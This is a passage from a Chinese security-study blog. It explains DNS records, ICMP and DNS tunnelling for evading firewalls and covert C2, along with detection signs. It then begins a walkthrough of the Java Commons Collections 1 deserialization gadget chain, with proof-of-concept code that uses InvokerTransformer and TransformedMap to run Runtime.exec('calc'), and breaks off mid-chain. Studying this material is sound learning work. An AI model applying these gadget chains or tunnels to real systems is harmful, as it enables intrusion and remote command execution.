title="CNAME记录（连锁店别名）"></a><strong>CNAME记录（连锁店别名）</strong></h3><p>Canonical Name，即别名解析。所谓别名解析就是可以为一个域名设置一个或者多个别名，如将aaa.com解析到bbb.net、将ccc.com也解析到bbb.net，其中bbb.net分别是aaa.com和ccc.com的别名</p><p><strong>功能</strong>：给域名起外号，多个名字指向同一个地方</p><p><em>例子</em>：<code>aaa.com</code>和<code>ccc.com</code>都指向<code>bbb.net</code>，就像“肯德基”和“KFC”是同一家店</p><p><strong>特点</strong></p><p>换服务器地址时，只用改主域名（比如<code>bbb.net</code>的IP），所有别名自动更新，不用一个个改</p><p>必须带前缀（比如<code>www.taobao.com</code>不能直接叫<code>taobao.com</code>，得用A记录</p><h3 id="NS记录（快递公司总部）"><a href="#NS记录（快递公司总部）" class="headerlink" title="NS记录（快递公司总部）"></a><strong>NS记录（快递公司总部）</strong></h3><p>为某个域名指定DNS解析服务器，也就是这个域名由指定的IP地址的DNS服务器取解析</p><p><strong>功能</strong>：指定谁负责你家域名的“快递分拣”（DNS解析）。<br><em>例子</em>：如果你用腾讯云的DNS服务，NS记录会写成<code>ns1.dnspod.com</code>，相当于把快递分拣工作外包给腾讯</p><p><strong>特点</strong></p><p>一个域名可以有多个分拣中心（比如主备DNS服务器）</p><p>改NS记录后，全球生效需要24-48小时（因为各地快递公司更新地址簿要时间）</p><h3 id="TXT记录（店铺留言板）"><a href="#TXT记录（店铺留言板）" class="headerlink" title="TXT记录（店铺留言板）"></a><strong>TXT记录（店铺留言板）</strong></h3><p>为某个主机名或域名设置说明，如可以为ddd.net设置TXT记录为”这是XXX的博客”这样的说明</p><p><strong>功能</strong>：给域名贴个“备注标签”，用来验证身份或防垃圾邮件</p><p><em>例子</em>：</p><p>验证域名所有权：加一条TXT记录<code>google-site-verification=xxxxx</code>，证明你是网站主人</p><p>防垃圾邮件：设置SPF记录<code>v=spf1 include:aliyun.com ~all</code>，告诉别人“只有阿里云的服务器能代表我发邮件</p><p><strong>特点</strong></p><p>内容随便写，但格式要对（比如SPF记录必须以<code>v=spf1</code>开头）</p><p>简单学习了这个协议的基础知识之后就准备学习内网穿透的知识</p><h1 id="内网渗透系列：内网穿透（隧道）学习"><a href="#内网渗透系列：内网穿透（隧道）学习" class="headerlink" title="内网渗透系列：内网穿透（隧道）学习"></a>内网渗透系列：内网穿透（隧道）学习</h1><h2 id="内网穿透概述"><a href="#内网穿透概述" class="headerlink" title="内网穿透概述"></a>内网穿透概述</h2><h5 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h5><p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络</p><p><em>内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。</em></p><p>简单来说内网穿透的目的是：让外网能访问你本地的应用，例如在外网打开你本地<a href="http://127.0.0.1指向的web站点.举例子我的世界你想要进行局域网联机同时要和你远在天边的朋友进行游玩那么盆友就可以利用内网穿透来达成与你玩的目的/">http://127.0.0.1指向的Web站点。举例子我的世界你想要进行局域网联机同时要和你远在天边的朋友进行游玩那么盆友就可以利用内网穿透来达成与你玩的目的</a></p><p>这里简单了解下NAT协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**NAT 协议（Network Address Translation）** 的应用场景如同它的名称——网络地址转换，应用于内部网到外部网的地址转换过程中。</span><br><span class="line"></span><br><span class="line">**核心功能**：把内网设备的“私有门牌号”（私有IP）转换成外网的“公共门牌号”（公网IP），方便内外网通信</span><br><span class="line"></span><br><span class="line">*例子*：你家在小区3号楼（内网IP `192.168.1.5`），但快递单上只能写小区大门地址（公网IP `219.155.6.240`），门卫（NAT设备）负责把快递送到你家</span><br><span class="line"></span><br><span class="line">**为什么需要NAT？****</span><br><span class="line"></span><br><span class="line">**根本原因**：全球公网IP不够用（类似门牌号不够），而小区（内网）可以无限复制私有门牌号</span><br></pre></td></tr></table></figure><p>那么想要实现内网穿透就得进行一个搭建桥梁</p><h3 id="常见实现方式（怎么搭桥？）"><a href="#常见实现方式（怎么搭桥？）" class="headerlink" title="常见实现方式（怎么搭桥？）****"></a><strong>常见实现方式</strong>（怎么搭桥？）****</h3><p>端口映射 反向代理，vpn隧道，NAT进行穿透</p><p>端口映射就是把内网的ip都映射到一个公网的端口上面所有的流量就会从公网ip端口进入到你的内网ip</p><p>反向代理 就比如说我们租一个云服务器，别人对云服务的公网ip进行访问，服务器会把别人访问的流量转接到我们内网的设备</p><p><strong>例子</strong>：用frp工具把内网摄像头画面通过云服务器暴露给外网</p><p>vpn就是开一条新的隧道 直接到公网不会经过运营商</p><p>内网穿透（NAT穿透）蒋NAT设备记录用来把内部网络的私有IP地址映射到外部网络的合法IP地址上去</p><p>搞清楚内网穿透的基本原理</p><p>终于到隧道技术了</p><h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a><strong>隧道技术</strong></h1><p>一种通过使用互联网络的基础设施在网络之间传递数据的方式，包括数据封装、传输和解包在内的全过程。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。</p><p>用大白话解释<strong>隧道技术</strong>，可以想象成<strong>给数据包穿马甲过安检</strong>的过程</p><p>整个过程就像快递员要把违禁品送过安检，必须套个合法的包装，过了检查再拆开还原。具体分三步走</p><h3 id="第一步：穿马甲（封装）"><a href="#第一步：穿马甲（封装）" class="headerlink" title="第一步：穿马甲（封装）"></a><strong>第一步：穿马甲（封装）</strong></h3><p><strong>伪装需求</strong>：比如你想从公司内网传文件到家里，但公司防火墙只允许HTTP流量通过（其他协议全被拦截）</p><p><strong>套外壳</strong>：隧道技术会把你的文件数据（比如SSH协议）塞进HTTP协议的“快递箱”里，并贴上新标签（如目标地址、端口）</p><p><em>就像把私密信件塞进月饼盒，外面写上“节日礼品”蒙混过关。</em></p><h3 id="第二步：过安检（传输）"><a href="#第二步：过安检（传输）" class="headerlink" title="第二步：过安检（传输）"></a><strong>第二步：过安检（传输）</strong></h3><p><strong>走公共通道</strong>：伪装后的数据包通过公共网络（比如互联网）传输，防火墙看到的是合法的HTTP流量，直接放行<em>比如用微信发文件，实际走的是微信的服务器通道，而不是直连对方电脑。</em></p><p><strong>路由中转</strong>：数据包可能经过多个路由器跳转，但全程保持“马甲”不脱落<em>类似快递从北京发广州，中间经过郑州、长沙中转站，但月饼盒始终完好</em></p><h3 id="第三步：拆包裹（解包）"><a href="#第三步：拆包裹（解包）" class="headerlink" title="第三步：拆包裹（解包）"></a><strong>第三步：拆包裹（解包）</strong></h3><p><strong>目的地验收</strong>：数据包到达目标服务器后，隧道端点（如家里的VPN服务器）会拆掉HTTP的“马甲”，还原出原始数据（SSH协议文件）</p><p><em>就像收到月饼盒后拆开，取出里面的私密信件</em><strong>精准投递</strong>：解包后的数据按原始协议送到最终设备（如你的家用电脑）</p><p>按所处的协议层分层：</p><ul><li>网络层隧道：ICMP隧道等</li><li>传输层隧道：TCP隧道、UDP隧道</li><li>应用层隧道：HTTP、DNS、SSH等隧道</li></ul><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250321142723.png"></p><p>那么内网里面除了刚才了解到的http协议可以通过防火墙进行出网还有哪些协议呢</p><h3 id="内网主机所有可能的出网方式"><a href="#内网主机所有可能的出网方式" class="headerlink" title="内网主机所有可能的出网方式"></a>内网主机所有可能的出网方式</h3><h5 id="允许ICMP协议出网"><a href="#允许ICMP协议出网" class="headerlink" title="允许ICMP协议出网"></a>允许ICMP协议出网</h5><h2 id="ICMP隧道原理"><a href="#ICMP隧道原理" class="headerlink" title="ICMP隧道原理"></a>ICMP隧道原理</h2><p>首先了解下ICMP这个协议</p><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p>简单来说就是一个检查网络可不可达的协议</p><p>原理</p><p>由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性。</p><p>通常ICMP隧道技术采用ICMP的ICMP_ECHO和ICMP_ECHOREPLY两种报文，把数据隐藏在ICMP数据包包头的选项域中，利用ping命令建立隐蔽通道。</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/6a123b327b673db81ffb5ffb471e2cc.png"></p><p>进行隐蔽传输的时候，肉鸡(防火墙内部)运行并接受外部攻击端的ICMP_ECHO数据包，攻击端把需要执行的命令隐藏在ICMP_ECHO数据包中，肉鸡接收到该数据包，解出其中隐藏的命令，并在防火墙内部主机上执行，再把执行结果隐藏在ICMP_ECHOREPLY数据包中，发送给外部攻击端。</p><p>比如：攻击者把指令<code>whoami</code>藏在数据区，发到内网机器，内网机器执行<code>whoami</code>后，把结果藏在回应的ICMP包里发回去</p><h3 id="ICMP隧道能干啥？"><a href="#ICMP隧道能干啥？" class="headerlink" title="ICMP隧道能干啥？"></a><strong>ICMP隧道能干啥？</strong></h3><p><strong>绕过防火墙</strong>：</p><p>内网机器被限制只能<code>ping</code>外网，但通过ICMP隧道可以偷偷传文件或远程控制</p><ul><li><em>例子：公司内网禁止SSH，但允许<code>ping</code>，员工用ICMP隧道传敏感文件。</em></li></ul><p><strong>反弹Shell</strong></p><p>攻击者通过ICMP包向受害机器发送指令，受害机器执行后通过ICMP包返回结果，实现远程控制</p><p><strong>内网穿透</strong></p><p>内网主机通过ICMP隧道将流量转发到公网代理，实现访问外网资源（类似早年免费上网的“黑科技”）</p><h3 id="三、ICMP隧道的优缺点"><a href="#三、ICMP隧道的优缺点" class="headerlink" title="三、ICMP隧道的优缺点"></a><strong>三、ICMP隧道的优缺点</strong></h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a><strong>优点</strong></h4><p><strong>隐蔽性强</strong>：数据藏在<code>ping</code>包里，防火墙一般不管</p><p><strong>无需端口</strong>：直接利用系统内核处理ICMP协议，不依赖特定端口</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a><strong>缺点</strong></h4><p><strong>速度慢</strong>：ICMP包默认数据量小（Windows 32字节、Linux 48字节），大文件传输像蚂蚁搬家</p><p><strong>不稳定</strong>：ICMP是无连接协议，容易丢包，适合传小指令，不适合高清视频</p><p><strong>权限要求高</strong>：修改ICMP数据需要管理员权限（普通用户玩不转）</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><ul><li><p>检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道的浏览器在同一时间会产生上千个 ICMP 数据包。</p></li><li><p>寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。</p></li><li><p>注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64 比特，这样会使得更难以被检测到。</p></li><li><p>检查ICMP数据包的协议标签，例如icmptunnel 会在所有的 ICMPpayload 前面增加 ‘TUNL’ 标记以用于识别隧道，这就是特征。</p></li></ul><h1 id="允许特定的TCP或UDP协议端口出网"><a href="#允许特定的TCP或UDP协议端口出网" class="headerlink" title="允许特定的TCP或UDP协议端口出网"></a>允许特定的TCP或UDP协议端口出网</h1><p>络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。</p><p>在一个不能出网的网络环境里面，将所有的TCP和UPD端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致：</p><p>比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行<br>比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口</p><h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><h5 id="允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"><a href="#允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）" class="headerlink" title="允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"></a>允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）</h5><p>这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议</p><p>原理</p><p>端口不和服务绑定，可以传输任何数据。</p><p>详细聊聊这段文字 端口不和服务绑定是什么意思呢，意思就是DNS的53号端口它如果只能传递带有DNS头的数据包的流量这个就叫做端口和服务进行绑定但是DNS端口可以传输文件，指令甚至可以传输电影 这个意思就是端口和服务没有进行绑定 这就造成了我们对DNS隧道的一个利用</p><p>C&amp;C服务器在建立连接后将指令传递给客户端上的后门程序。</p><p>客户端后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果，如果互联网上有一台攻击者设置的服务器，那么服务器就可以依靠域名解析的响应进行数据包的交换，从DNS协议的角度来看，这样的操作只是反复查询某个或者某些特定的域名并且得到解析结果，但其本质是，DNS预期的返回结果应该是一个IP地址，而事实上返回的可以是任意字符串，包括加密的C&amp;C指令，从而将其他协议封装在DNS协议中进行传输。<br>DNS隧道（直联型）木马的通信结构如下：</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/c35866a915140c30a95b310e6f3fe54.png"></p><p>直连也就是客户端直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度更快，但是隐蔽性较差，容易被WAF或者IDS设备探测到，另外限制比较高，很多实际场景下不允许攻击者来自定义DNS Server，否则很容易被发现。</p><p>名中继型：</p><p>通过DNS递归查询实现的中继隧道，比较隐蔽，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多(其实就类似伪造一台私有DNS Server，当然也许大佬神仙们真有一台权威DNS Server也说不一定哈)，同时我们还需要规避本地客户端的DNS缓存，这里可以使用随机域名生成算法（DGA）。很多恶意软件利用该算法生成随机域名，有效绕过黑名单检测，通过轮询的方式尝试连接，寻找C2控制中心。（DGA算法的检测测方法也有不少，这里按下不表）<br><img src="C:\Users\GuoFen\AppData\Roaming\Typora\typora-user-images\image-20250321154330405.png" alt="image-20250321154330405"></p><p>①受到木马控制的PC将数据封装到DNS数据报文里，向位于内网的本地域名服务器请求查询baidu.com</p><p>②本地域名服务器透过防火墙向根域名服务器发送查询请求</p><p>③经过大量的递归重定向，查询请求发到baidu.com的（伪造）权威域名服务器</p><p>④baidu.com（伪造）权威域名服务器是在攻击者控制下，解析并发送响应包</p><p>⑤dns响应包穿透内网防火墙</p><p>⑥进入内网</p><p>⑦本地域名服务器将响应包返回给受控客户端检测：</p><p>缺点：</p><ul><li><strong>速度慢</strong>：DNS查询需要来回多次，传大文件会急死人。</li><li><strong>可能被检测</strong>：防火墙发现大量异常DNS请求会报警。</li><li><strong>需要自建NS服务器</strong>：得有个服务器随时待命处理查询。</li></ul><h3 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h3><ul><li>每个IP地址的DNS流量异常，DNS报文数量大</li><li>DNS消息中TXT或NULL等不常用的记录类型多</li><li>DNS消息中域名有部分固定不变</li><li>DNS服务器的地理位置异常</li><li>访问非受信的DNS服务器</li><li>基于请求域名长度及请求频率统计分析方法</li><li>dnscat 查询中包含了dnscat 字符串</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学习一下网络知识&lt;/p&gt;
&lt;p&gt;主要学习下DNS,因为在后续的内网渗透与应急感觉用的会比较多&lt;/p&gt;
&lt;p&gt;DNS解析流程有个大致的了解 这里就不一一细谈了主要还是学习一下域名解析记录&lt;/p&gt;
&lt;h2 id=&quot;域名解析记录&quot;&gt;&lt;a href=&quot;#域名解析记录&quot; class=</summary>
      
    
    
    
    <category term="network" scheme="https://gu0f3n.github.io/categories/network/"/>
    
    
    <category term="network" scheme="https://gu0f3n.github.io/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>cc1分析</title>
    <link href="https://gu0f3n.github.io/2025/03/19/cc1%E5%88%86%E6%9E%90/"/>
    <id>https://gu0f3n.github.io/2025/03/19/cc1%E5%88%86%E6%9E%90/</id>
    <published>2025-03-19T11:48:51.000Z</published>
    <updated>2025-03-20T10:13:17.967Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>环境搭建不说了 网上很多优秀的文章教学</p><p>先列出利用的链子然后我们需要倒着进行分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()--&gt;</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;</span><br><span class="line">TransformedMap.checkSetValue()--&gt;</span><br><span class="line">ChainedTransformer.transform()--&gt;</span><br><span class="line">InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p>CC1链的<strong>末尾</strong>（入口&#x2F;源头）就是Commons Collections库中的<code>Tranformer</code>接口，这个接口里面有个<code>transform</code>方法。</p><p><strong>InvokerTransformer</strong></p><p>找到这个类发现实现了Tranformer接口的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//定义了一个返回类型是object的公共方法且接受的参数是一个input的Object</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;<span class="comment">//检查传入的参数是否为null,为null直接返回null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//反射获取 input 对象的 Class 对象。</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//从 cls 表示的类中查找一个公共方法，并返回对应的 Method 对象。</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//调用 method 表示的方法，并返回其结果</span></span><br></pre></td></tr></table></figure><p>可以看到这段代码 代码不好建议逐句分析这里直接放到注释里面</p><p>这就完全符合反序列化的参数可控可以直接进行利用，参数可控就导致了<strong>反射调用任意类 任意方法</strong>。</p><p>进行利用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//正常 调用可命令执行的方法</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//使用反射 调用可命令执行的方法</span></span><br><span class="line">        <span class="comment">//Class clazz = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method cmdMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//cmdMethod.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//InvokerTransformer类 调用可命令执行的方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);<span class="comment">//给InvokerTransformer里的参数赋值，然后调用transform（cmd），最终实习在cmd上实现Runtime.getRuntime().exec(&quot;calc&quot;)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250319202058.png"></p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>知道了<code>InvokerTransformer</code>类可以调用<code>transform()</code>方法执行命令，那接下来的思路就是寻找还有其他什么地方调用了<code>InvokerTransformer</code>类的<code>transform()</code>方法。</p><p>可以看到在TransformedMap这个类下面的checkSetValue方法调用了从valueTransformer.transform</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320133956.png"></p><p>往上找valueTransformer </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现 keyTransformer，valueTransformer 参数可控 但是是protected，只能内部类访问，权限不够，往上找，查看是谁具体调用了方法checkSetValue()内部的这个transform()，发现是valueTransformer进行调用，查看valueTransformer，发现valueTransformer也是protect权限，继续查看valueTransformer从哪里来的，最后我们发现decorate()调用TransformedMap()的构造方法来的，所有涉及到的方法，只有decorate的权限修饰符是public</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这个decorate类我们就可以进一步控制valueTransformer</p><p>关键：<code>TransformedMap</code> 本身不存储数据，而是将操作委托给原始 <code>HashMap</code>，并在操作前后触发转换器逻辑。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里穿插一下TransformedMap装饰器本事就像是一个外挂没有实际作用需要HashMap来存储键值对，需要披挂在HashMap上才能发挥作用</span><br></pre></td></tr></table></figure><p>由于我们使用的是transformMap的方法，所以先去构建一个HashMap，再通过这个map来调用transformer内的decorate()来完成一个transformedMap的实例化，最后再想办法触发checkSetValue()方法即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r=Runtime.*getRuntime*();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line"> HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//这个直接实例化一个HashMap</span></span><br><span class="line"></span><br><span class="line"> Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer); </span><br><span class="line"><span class="comment">//静态方法staic修饰直接类名＋方法名调用</span></span><br><span class="line"><span class="comment">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span></span><br></pre></td></tr></table></figure><p><strong>寻找调用checkSetValue()的方法</strong></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320142341.png"></p><p>发现AbstractlnputCheckedMapDecorator类种的setValue方法可以进行对checkSetvalue的调用那么就</p><p><code>checkSetValue()</code>是<code>TransformedMap</code>的关键方法，用于在值被修改时应用转换逻辑。当调用 <code>Map.Entry.setValue()</code> 修改条目值时，<code>TransformedMap</code> 的 <code>checkSetValue()</code> 会被触发，对值进行转换。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">穿插：Map里存储了键值对,每一个键值对被java封装成一个Entry对象，当想修改键值对的值的时候就可以可以直接通过`Entry`的`setValue()`方法进行修改，这里因为有装饰器TransformedMap，装饰器TransformedMap监听对值的修改操作，就是每当想调用**`setValue()`时，外挂会先触发`checkSetValue()`方法**，对修改的值做额外的处理</span><br></pre></td></tr></table></figure><p>MapEntry类实际上是重写父类AbstractMapEntryDecorator的setValue()方法</p><p>MapEntry的父类AbstractMapEntryDecorator又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue()，，然后水到渠成的调用checkSetValue()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释下为什么要遍历：`TransformedMap`的机制**：它通过装饰`Map.Entry`对象（每个纸条）来监听修改操作，直接调用`map.put(&quot;键&quot;, &quot;新值&quot;)`可能绕开外挂程序，遍历后通过`entry.setValue()`修改，才能确保外挂程序被调用，**底层原因：TransformedMap`的`Map.Entry`是改装过的（`AbstractMapEntryDecorator`的子类），它的`setValue()`方法被重写，主动调用`checkSetValue()，遍历是确保每个`Entry`都使用改装后的方法的关键步骤 </span><br></pre></td></tr></table></figure><p>一句话就是确保每个<code>Entry</code>都使用改装后的方法，进而更好调用setvalue去调用checkSetvalue</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">​    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">​    <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">​    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">​            map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//遍历Map常用格式</span></span><br><span class="line">​        <span class="comment">//调用setValue方法，通过setValue去触发checkSetValue()</span></span><br><span class="line">​        entry.setValue(runtime);      </span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(Map.Entry entry:transformedMap.entrySet()) &#123;   *//遍历Map常用格式*    entry.setValue(runtime);                      &#125;</span><br></pre></td></tr></table></figure><p>  在这里， transformedMap是经过装饰的 Map对象，具有特殊的行为。通过 entrySet() 方法获取了键值对的集合，然后进行遍历。transformedMap.entrySet()返回的是一个包含 <code>Map.Entry</code> 对象的集合，这样就可以遍历 M ap 的键值对。Map.Entry 是一个内部接口，用于表示<code>Map</code>中 的键值对，其中可以通过 getKey() 获取键，通过 getValue()获取值。</p><p>因为Map里的entrySet()是被transformedMap装饰器进行外挂的，本来是要去Map种的setvalue方法，但是经过装饰器的定义绘制街道MapEntry种调用里面的setValue方法进而去调用checkSetValue方法</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/d7418d2c06802f2f2f3715b5cd7b0d2.png"></p><p>梳理</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/9b9e63ced9a4747901d62b2c7088a6c.png"></p><p>首先，我们找到了TransformedMap这个类，我们想要调用其中的checkSetValue方法，但是这个类的构造器是peotected权限，只能类中访问，所以我们调用decorate方法来实例化这个类，</p><p> 在此之前我们先实例化了一个HashMap,并且调用了put方法给他赋了一个键值对(这里是为了让我们再后边的遍历中调用setValue()提供前置条件)，然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，</p><p> 